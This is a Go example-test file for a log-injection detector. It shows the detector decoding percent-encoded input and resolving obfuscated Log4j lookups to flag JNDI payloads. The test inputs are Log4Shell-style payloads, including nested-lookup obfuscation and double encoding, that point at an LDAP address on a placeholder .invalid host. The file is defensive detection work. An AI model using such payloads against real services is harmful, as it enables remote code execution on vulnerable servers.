package engine_test

import (
	"fmt"

	"github.com/TurlaFSB/logshield/internal/engine"
)

func ExampleDecode() {
	// A payload encoded twice. Every layer is kept, because the application may
	// stop decoding at any of them.
	res := engine.Decode("%2524%257Bjndi", engine.Limits{})
	for _, s := range res.Stages {
		fmt.Printf("%q %v\n", s.Text, s.Path)
	}
	// Output:
	// "%2524%257Bjndi" []
	// "%24%7Bjndi" [percent]
	// "${jndi" [percent percent]
}

func ExampleResolve() {
	// The prefix is spelled out of four different lookups, but Log4j would
	// evaluate it to "jndi", so it is reported.
	res := engine.Resolve("${${lower:j}${upper:n}${::-d}${env:NaN:-i}:ldap://x.invalid/a}", engine.Limits{})
	for _, f := range res.Findings {
		fmt.Println(f.Kind, f.Scheme, f.Key, "obfuscated:", f.Obfuscated)
	}
	// Output:
	// jndi ldap ldap://x.invalid/a obfuscated: true
}

func ExampleResolve_afterDecoding() {
	// Decode first, then resolve each variant: the payload only exists after the
	// percent layer is removed.
	dec := engine.Decode("%24%7B%24%7Blower:j%7Dndi:ldap://x.invalid/a%7D", engine.Limits{})
	for _, st := range dec.Stages {
		for _, f := range engine.Resolve(st.Text, engine.Limits{}).Findings {
			fmt.Println("found after", st.Path, "->", f.Kind, f.Key)
		}
	}
	// Output:
	// found after [percent] -> jndi ldap://x.invalid/a
}
